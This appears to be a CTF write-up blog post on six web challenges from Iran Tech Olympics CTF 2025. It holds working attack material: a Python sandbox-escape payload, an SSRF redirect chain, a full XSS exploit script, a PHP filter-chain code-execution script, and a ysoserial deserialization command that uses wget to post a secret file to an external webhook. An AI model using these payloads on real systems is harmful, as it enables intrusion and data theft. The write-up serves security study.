---
title: "Iran Tech Olympics CTF 2025 - Web Challenges Writeup"
date: 2025-09-28 00:00:00 +0000
categories: [CTF, Web]
tags: [ctf, writeup, web, python, php, java, deserialization]
image:
  path: "assets/img/2025-09-28-Iran_Tech_Olympics_CTF_2025/ctf-avatar.png"
  alt: "Iran Tech Olympics CTF 2025"
---

## CTF Overview

**Event:** Iran Tech Olympics CTF 2025  
**Date:** September 28, 2025  
**Category Focus:** Web  

This writeup covers my solutions for the web challenges from Iran Tech Olympics CTF 2025. The challenges were well-designed with a good balance of difficulty and creativity.

---

## Vibe Web Mail

**Challenge:** Vibe Web Mail  
**Category:** Web  

> Vibe coder makes a vibing web mail!  
> **URL:** http://65.109.209.215:5000

### Analysis

The vulnerability exists in the `emails/routes.py` file:

```python
from utils import ..., render_email_template, ...
...
rendered_body = render_email_template(form.body.data)
```

The payload is then processed by `safe_eval()`:

```python
def render_email_template(template_str):
    try:
        template = safe_eval(template_str)
        return template
    except Exception as e:
        current_app.logger.error(f"Template rendering error: {e}")
        return None
```

**Full implementation of `safe_eval.py`:**

```python
import dis
import logging
import functools
from opcode import opmap, opname
from types import CodeType
import types
import datetime
import ctypes

_logger = logging.getLogger(__name__)

unsafe_eval = eval

_BUILTINS = {
    'datetime': datetime,
    'True': True,
    'False': False,
    'None': None,
    'bytes': bytes,
    'str': str,
    'unicode': str,
    'bool': bool,
    'int': int,
    'float': float,
    'enumerate': enumerate,
    'dict': dict,
    'list': list,
    'tuple': tuple,
    'map': map,
    'abs': abs,
    'min': min,
    'max': max,
    'sum': sum,
    'reduce': functools.reduce,
    'filter': filter,
    'sorted': sorted,
    'round': round,
    'len': len,
    'repr': repr,
    'set': set,
    'all': all,
    'any': any,
    'ord': ord,
    'chr': chr,
    'divmod': divmod,
    'isinstance': isinstance,
    'range': range,
    'xrange': range,
    'zip': zip,
    'Exception': Exception,
}

def to_opcodes(opnames, _opmap=opmap):
    for x in opnames:
        if x in _opmap:
            yield _opmap[x]

_BLACKLIST = set(to_opcodes([
    'IMPORT_STAR', 'IMPORT_NAME', 'IMPORT_FROM',
    'STORE_ATTR', 'DELETE_ATTR',
    'STORE_GLOBAL', 'DELETE_GLOBAL',
]))

_CONST_OPCODES = set(to_opcodes([
    'POP_TOP', 'ROT_TWO', 'ROT_THREE', 'ROT_FOUR', 'DUP_TOP', 'DUP_TOP_TWO',
    'LOAD_CONST',
    'RETURN_VALUE',
    'BUILD_LIST', 'BUILD_MAP', 'BUILD_TUPLE', 'BUILD_SET',
    'BUILD_CONST_KEY_MAP',
    'LIST_EXTEND', 'SET_UPDATE',
    'COPY', 'SWAP',
    'RESUME',
    'RETURN_CONST',
    'TO_BOOL',
])) - _BLACKLIST

_operations = [
    'POWER', 'MULTIPLY',
    'FLOOR_DIVIDE', 'TRUE_DIVIDE', 'MODULO', 'ADD',
    'SUBTRACT', 'LSHIFT', 'RSHIFT', 'AND', 'XOR', 'OR',
]

_EXPR_OPCODES = _CONST_OPCODES.union(to_opcodes([
    'UNARY_POSITIVE', 'UNARY_NEGATIVE', 'UNARY_NOT', 'UNARY_INVERT',
    *('BINARY_' + op for op in _operations), 'BINARY_SUBSCR',
    *('INPLACE_' + op for op in _operations),
    'BUILD_SLICE',
    'LIST_APPEND', 'MAP_ADD', 'SET_ADD',
    'COMPARE_OP',
    'IS_OP', 'CONTAINS_OP',
    'DICT_MERGE', 'DICT_UPDATE',
    'GEN_START',
    'BINARY_OP',
    'BINARY_SLICE',
])) - _BLACKLIST

_SAFE_OPCODES = _EXPR_OPCODES.union(to_opcodes([
    'POP_BLOCK', 'POP_EXCEPT',
    'SETUP_LOOP', 'SETUP_EXCEPT', 'BREAK_LOOP', 'CONTINUE_LOOP',
    'EXTENDED_ARG', 
    'MAKE_FUNCTION', 'CALL_FUNCTION', 'CALL_FUNCTION_KW', 'CALL_FUNCTION_EX',
    'CALL_METHOD', 'LOAD_METHOD',
    'GET_ITER', 'FOR_ITER', 'YIELD_VALUE',
    'JUMP_FORWARD', 'JUMP_ABSOLUTE', 'JUMP_BACKWARD',
    'JUMP_IF_FALSE_OR_POP', 'JUMP_IF_TRUE_OR_POP', 'POP_JUMP_IF_FALSE', 'POP_JUMP_IF_TRUE',
    'SETUP_FINALLY', 'END_FINALLY',
    'BEGIN_FINALLY', 'CALL_FINALLY', 'POP_FINALLY',
    'RAISE_VARARGS', 'LOAD_NAME', 'STORE_NAME', 'DELETE_NAME', 'LOAD_ATTR',
    'LOAD_FAST', 'STORE_FAST', 'DELETE_FAST', 'UNPACK_SEQUENCE',
    'STORE_SUBSCR',
    'LOAD_GLOBAL',
    'RERAISE', 'JUMP_IF_NOT_EXC_MATCH',
    'PUSH_NULL', 'PRECALL', 'CALL', 'KW_NAMES',
    'POP_JUMP_FORWARD_IF_FALSE', 'POP_JUMP_FORWARD_IF_TRUE',
    'POP_JUMP_BACKWARD_IF_FALSE', 'POP_JUMP_BACKWARD_IF_TRUE',
    'POP_JUMP_FORWARD_IF_NONE', 'POP_JUMP_BACKWARD_IF_NONE',
    'POP_JUMP_FORWARD_IF_NOT_NONE', 'POP_JUMP_BACKWARD_IF_NOT_NONE',
    'CHECK_EXC_MATCH',
    'RETURN_GENERATOR',
    'PUSH_EXC_INFO',
    'NOP',
    'FORMAT_VALUE', 'BUILD_STRING',
    'END_FOR',
    'LOAD_FAST_AND_CLEAR', 'LOAD_FAST_CHECK',
    'POP_JUMP_IF_NOT_NONE', 'POP_JUMP_IF_NONE',
    'CALL_INTRINSIC_1',
    'STORE_SLICE',
    'CALL_KW', 'LOAD_FAST_LOAD_FAST',
    'STORE_FAST_STORE_FAST', 'STORE_FAST_LOAD_FAST',
    'CONVERT_VALUE', 'FORMAT_SIMPLE', 'FORMAT_WITH_SPEC',
    'SET_FUNCTION_ATTRIBUTE',
])) - _BLACKLIST

_UNSAFE_ATTRIBUTES = [
    'f_builtins', 'f_code', 'f_globals', 'f_locals',
    'func_code', 'func_globals',
    'co_code', '_co_code_adaptive',
    'mro',
    'tb_frame',
    'gi_code', 'gi_frame', 'gi_yieldfrom',
    'cr_await', 'cr_code', 'cr_frame',
    'ag_await', 'ag_code', 'ag_frame',
]

def safe_eval(expr, globals_dict=None, locals_dict=None, mode="eval", nocopy=False, locals_builtins=False, filename=None):
    if type(expr) is CodeType:
        raise TypeError("safe_eval does not allow direct evaluation of code objects.")

    if not nocopy:
        if (globals_dict is not None and type(globals_dict) is not dict) \
                or (locals_dict is not None and type(locals_dict) is not dict):
            _logger.warning(
                "Looks like you are trying to pass a dynamic environment, "
                "you should probably pass nocopy=True to safe_eval().")
        if globals_dict is not None:
            globals_dict = dict(globals_dict)
        if locals_dict is not None:
            locals_dict = dict(locals_dict)

    check_values(globals_dict)
    check_values(locals_dict)

    if globals_dict is None:
        globals_dict = {}

    globals_dict['__builtins__'] = dict(_BUILTINS)
    if locals_builtins:
        if locals_dict is None:
            locals_dict = {}
        locals_dict.update(_BUILTINS)
    c = test_expr(expr, _SAFE_OPCODES, mode=mode, filename=filename)
    try:
        return unsafe_eval(c, globals_dict, locals_dict)
    except Exception as e:
        raise ValueError('%r while evaluating\n%r' % (e, expr))
    
def check_values(d):
    if not d:
        return d
    for v in d.values():
        if isinstance(v, types.ModuleType):
            raise TypeError(f"""Module {v} can not be used in evaluation contexts.""")
    return d
                            
def test_expr(expr, allowed_codes, mode="eval", filename=None):
    try:
        if mode == 'eval':
            expr = expr.strip()
        code_obj = compile(expr, filename or "", mode)
    except (SyntaxError, TypeError, ValueError):
        raise
    except Exception as e:
        raise ValueError('%r while compiling\n%r' % (e, expr))
    assert_valid_codeobj(allowed_codes, code_obj, expr)
    return code_obj

def assert_valid_codeobj(allowed_codes, code_obj, expr):
    assert_no_dunder_name(code_obj, expr)

    code_codes = {i.opcode for i in dis.get_instructions(code_obj)}
    if not allowed_codes >= code_codes:
        raise ValueError("forbidden opcode(s) in %r: %s" % (expr, ', '.join(opname[x] for x in (code_codes - allowed_codes))))

    for const in code_obj.co_consts:
        if isinstance(const, CodeType):
            assert_valid_codeobj(allowed_codes, const, 'lambda')

def assert_no_dunder_name(code_obj, expr):
    for name in code_obj.co_names:
        if "__" in name or name in _UNSAFE_ATTRIBUTES:
            raise NameError('Access to forbidden name %r (%r)' % (name, expr))
```

The code implements several security checks:

1. **Module detection** - Prevents direct module usage:
   ```python
   def check_values(d):
       if not d:
           return d
       for v in d.values():
           if isinstance(v, types.ModuleType):
               raise TypeError(f"""Module {v} can not be used in evaluation contexts.""")
       return d
   ```

2. **Dunder name filtering** - Blocks dangerous attributes:
   ```python
   def assert_no_dunder_name(code_obj, expr):
       for name in code_obj.co_names:
           if "__" in name or name in _UNSAFE_ATTRIBUTES:
               raise NameError('Access to forbidden name %r (%r)' % (name, expr))
   ```

3. **Nested function validation** - Checks lambda functions:
   ```python
   for const in code_obj.co_consts:
       if isinstance(const, CodeType):
           assert_valid_codeobj(allowed_codes, const, 'lambda')
   ```

### Solution

The security checks only work at **compile-time**, not **runtime**. The key insight is that `string.format()` is available and can be exploited.

**Exploitation technique:**
- Use generator expressions to access frame objects
- Chain through the object hierarchy to reach system modules
- Extract environment variables containing the flag

**Payload:**
```python
'{0.gi_frame.f_globals[__builtins__][datetime].__dict__[sys].modules[os].environ[FLAG]}'.format((x for x in []))
```

This payload:
1. Creates a generator expression `(x for x in [])`
2. Accesses its frame via `gi_frame`
3. Navigates to globals and builtins
4. Reaches the `os` module through `sys.modules`
5. Extracts the `FLAG` environment variable

### Key Takeaways

- **Python jail bypass** techniques using generators
- **Runtime vs compile-time** security differences
- **Object introspection** through frame navigation
- **Environment variable** access through system modules

---

## Simple Fetcher

**Challenge:** Simple Fetcher  
**Category:** Web  

> We have developed a new, simple fetcher. Is it secure enough?  
> **URL:** http://65.109.213.16:3333 or http://65.109.184.196:3333

### Solution

This challenge involves **URL redirection bypass** through Google services.

**Attack vector:**
```
https://google.com/url?q=https://translate.google.com/translate?u=https://webhook.site/<webhook_id>
```

**Steps:**
1. Create a webhook that redirects to `localhost` 
2. Use Google's URL shortener to bypass filtering
3. Chain through Google Translate to reach internal services
4. Extract the flag from the local response


---

## Cat Lovers Hub

**Challenge:** Cat Lovers Hub  
**Category:** Web  

> Welcome to the Cat Lovers Hub!  
> Sometimes, what you see is only a fraction of the story. Your cat may hide secrets in unexpected places…  
> **URL:** http://65.109.176.78:3000/

### Analysis

This challenge involves **HTML injection** and **XSS** to extract a hidden flag from the admin panel.

### Solution

```bash
#!/usr/bin/env python3
"""
Exploit script for Cat Lovers Hub CTF challenge
Exploits HTML injection vulnerability in admin_preview.html to extract the flag
"""

import requests
import re
import time
from urllib.parse import quote

# Configuration
BASE_URL = "http://65.109.176.78:3000"
TARGET_URL = f"{BASE_URL}/admin/preview_blob"

def exploit_flag():
    """
    Exploit the HTML injection vulnerability to get the flag
    """
    print("[+] Starting Cat Lovers Hub flag extraction...")
    
    # Step 1: Create a session and submit malicious bio
    session = requests.Session()
    
    # Payload to extract the flag from the hidden div
    # This will break out of the data-bio attribute and inject JavaScript
    payload = '''"><script>
    var flagDiv = document.getElementById('real-flag');
    if (flagDiv) {
        var flag = flagDiv.textContent || flagDiv.innerText;
        document.body.innerHTML = '<h1>FLAG EXTRACTED:</h1><pre>' + flag + '</pre>';
        console.log('FLAG:', flag);
    }
    </script><div style="display:none"'''
    
    print(f"[+] Payload: {payload}")
    
    # Step 2: Submit the malicious bio
    submit_data = {
        'bio': payload
    }
    
    print("[+] Submitting malicious bio...")
    response = session.post(f"{BASE_URL}/submit", data=submit_data, allow_redirects=False)
    
    if response.status_code != 302:
        print(f"[-] Submit failed with status: {response.status_code}")
        return None
    
    # Extract session ID from redirect location or response headers
    sid = None
    if 'X-SID' in response.headers:
        sid = response.headers['X-SID']
        print(f"[+] Got session ID: {sid}")
    
    # Step 3: Get the player preview to obtain the token
    if sid:
        preview_url = f"{BASE_URL}/player_preview?sid={sid}"
    else:
        # Follow redirect to get SID
        location = response.headers.get('Location', '')
        if 'sid=' in location:
            sid = location.split('sid=')[1].split('&')[0]
            preview_url = f"{BASE_URL}/player_preview?sid={sid}"
        else:
            preview_url = f"{BASE_URL}/player_preview"
    
    print(f"[+] Getting player preview from: {preview_url}")
    preview_response = session.get(preview_url)
    
    if preview_response.status_code != 200:
        print(f"[-] Player preview failed with status: {preview_response.status_code}")
        return None
    
    # Extract token from the player preview page
    token_match = re.search(r'const token = "([^"]+)"', preview_response.text)
    if not token_match:
        print("[-] Could not extract token from player preview")
        return None
    
    token = token_match.group(1)
    print(f"[+] Extracted token: {token}")
    
    # Step 4: Access the admin preview with the token
    admin_url = f"{TARGET_URL}?token={token}"
    
    # Set required headers to bypass the checks
    headers = {
        'X-CTF': 'player',
        'Sec-Fetch-Dest': 'iframe',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print(f"[+] Accessing admin preview: {admin_url}")
    admin_response = session.get(admin_url, headers=headers)
    
    if admin_response.status_code != 200:
        print(f"[-] Admin preview failed with status: {admin_response.status_code}")
        print(f"[-] Response: {admin_response.text}")
        return None
    
    print("[+] Admin preview accessed successfully!")
    print("[+] Response content:")
    print("=" * 50)
    print(admin_response.text)
    print("=" * 50)
    
    # Try to extract flag from the response if it's visible
    flag_match = re.search(r'ASIS\{[^}]+\}', admin_response.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    
    # If the JavaScript executed, the flag might be in the modified HTML
    if 'FLAG EXTRACTED:' in admin_response.text:
        print("[+] JavaScript payload executed successfully!")
        # Extract flag from the modified content
        flag_extracted = re.search(r'FLAG EXTRACTED:</h1><pre>([^<]+)</pre>', admin_response.text)
        if flag_extracted:
            flag = flag_extracted.group(1)
            print(f"[+] FLAG EXTRACTED: {flag}")
            return flag
    
    return None

def alternative_exploit():
    """
    Alternative approach - try to exploit via direct injection
    """
    print("\n[+] Trying alternative exploitation method...")
    
    session = requests.Session()
    
    # Alternative payload that tries to access the flag directly
    alt_payload = '''"><img src=x onerror="var f=document.getElementById('real-flag');if(f){document.body.innerHTML='<h1>'+f.textContent+'</h1>';}"><div style="display:none"'''
    
    submit_data = {'bio': alt_payload}
    
    response = session.post(f"{BASE_URL}/submit", data=submit_data, allow_redirects=True)
    
    # Get the final page after redirect
    final_url = response.url
    print(f"[+] Final URL: {final_url}")
    
    # Extract SID from URL if present
    if 'sid=' in final_url:
        sid = final_url.split('sid=')[1].split('&')[0]
        
        # Try to get player preview
        preview_response = session.get(f"{BASE_URL}/player_preview?sid={sid}")
        
        # Extract token
        token_match = re.search(r'const token = "([^"]+)"', preview_response.text)
        if token_match:
            token = token_match.group(1)
            
            # Access admin preview
            headers = {
                'X-CTF': 'player',
                'Sec-Fetch-Dest': 'iframe'
            }
            
            admin_response = session.get(f"{TARGET_URL}?token={token}", headers=headers)
            
            print("[+] Alternative payload response:")
            print("=" * 50)
            print(admin_response.text)
            print("=" * 50)
            
            # Look for flag
            flag_match = re.search(r'ASIS\{[^}]+\}', admin_response.text)
            if flag_match:
                return flag_match.group(0)
    
    return None

if __name__ == "__main__":
    print("Cat Lovers Hub CTF Flag Extraction Tool")
    print("=" * 50)
    
    # Check if the service is running
    try:
        response = requests.get(BASE_URL, timeout=5)
        if response.status_code == 200:
            print("[+] Target service is accessible")
        else:
            print(f"[-] Target service returned status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Cannot connect to target service: {e}")
        print("[-] Make sure the application is running on localhost:3000")
        exit(1)
    
    # Try main exploit
    flag = exploit_flag()
    
    if not flag:
        print("\n[!] Main exploit failed, trying alternative method...")
        flag = alternative_exploit()
    
    if flag:
        print(f"\n🎉 SUCCESS! Flag captured: {flag}")
    else:
        print("\n❌ Exploit failed. The flag could not be extracted.")
        print("💡 Make sure the application is running and try manually accessing the admin preview.")
```

### Flag

```
ASIS{CSP_HERO_ARE'NT_YOU_2a7590cb-9559-48c8-bdb9-ca41c0d184ed}
```

---

## Vibe Web Mail 2

**Challenge:** Vibe Web Mail 2  
**Category:** Web  

> Vibe Coder is developing a modern web mail application that requires more robust implementation!  
> Please first solve Vibe Web Mail 1 first  
> **URL:** http://65.109.194.131:5001/

### Solution

This is a continuation of the first challenge with similar code, but the flag is stored in a **file** instead of an **environment variable**.

**Key differences:**
- Flag location: File system instead of environment
- Need file system access instead of environment access

**Exploitation approach:**
The `datetime` module contains a `sys` attribute in this Docker environment, allowing filesystem operations:

```python
# List directory contents
datetime.sys.modules['posix'].listdir('/')

# Read flag file
datetime.sys.modules['os'].popen('/hex_file').read()
```

---

## Dirty PHP

**Challenge:** Dirty PHP  
**Category:** Web  

> Are you a PHP lover? Let's be dirty!  
> **URL:** http://65.109.182.162:8080/

### Analysis

*Note: This solution is based on another competitor's writeup as I didn't solve it during the contest.*

**Key constraints:**
- If `$size == 8`, it passes the `strpos($content, $a[8])!==false` check
- `filesize($file_name)` should be 800-899 bytes
- `$data` must be smaller than 220 bytes

### Solution

**Attack strategy:**
1. Use **PHP filter chains** to manipulate file size (800-899 range)
2. Include the required string while keeping data under 220 bytes
3. Bypass PHP execution blocks using encoding tricks

**Bypass technique:**
- Use `zlib.inflate` for compression
- Apply `convert.base64-decode` **3 times** to remove `<?php echo 'hdllo'; exit(); ?>`
- Use `__halt_compiler()` to prevent PHP syntax errors

**Exploit script:**

```python
import os
import requests
import base64
import zlib
URL = "http://localhost:8080/"
# URL = "http://65.109.182.162:8080/"

s = requests.session()

fn = "php://filter/write=convert.base64-decode/convert.base64-decode/convert.base64-decode/zlib.inflate/resource=x"

params = dict(level=6, wbits=-15, memLevel=9) 
original_text = 'exec("touch /tmp/pwned");__halt_compiler();' + ("techolympics" * 65)

data = original_text.encode("utf-8")
print(f"The original text is {len(data)} bytes.")

cobj = zlib.compressobj(level=params["level"], wbits=params["wbits"], memLevel=params["memLevel"])
compressed = cobj.compress(data) + cobj.flush(zlib.Z_FINISH)

d = base64.b64encode(base64.b64encode(base64.b64encode(compressed)))

print("len fn, d: ", len(fn), len(d))
print(fn, d)
r = s.post(URL + "Dirty.php", data={
    "filename": fn,
    "file_name": f"x",
    "data": d
})
print(f"Status: {r.status_code}")
print(f"Response: {r.content}")
```

---

## Secret Formula

**Challenge:** Secret Formula  
**Category:** Web  

> Can you find the secret formula of the Krabby Patty?  
> **URL:** http://65.109.190.242:8080/

### Analysis

This challenge involves **Java deserialization** vulnerability using serialized gadget chains.

### Solution

**Tool discovery:** First encounter with `ysoserial.jar` - a powerful tool for generating serialized gadgets for specific Java versions.

**Exploitation steps:**

1. **Generate payload** using ysoserial:
   ```bash
   java -jar ysoserial-all.jar CommonsCollections5 \
     'wget --post-file=/safebox/secretformula.txt https://webhook.site/eabfaaa7-a0e3-434d-b176-6b21cae103f0' \
     | base64 > payload.bin
   ```

2. **Gadget chain:** `CommonsCollections5` is compatible with this JDK version

3. **Delivery method:** Pass the base64-encoded payload as a user cookie

4. **Exfiltration:** The payload sends the flag file to the webhook

---

## Final Thoughts

**Contest Rating:** ⭐⭐⭐⭐⭐

This CTF had an excellent balance of difficulty and creativity, also fall in love (actually bug) with the vibing style of the given source code haha.
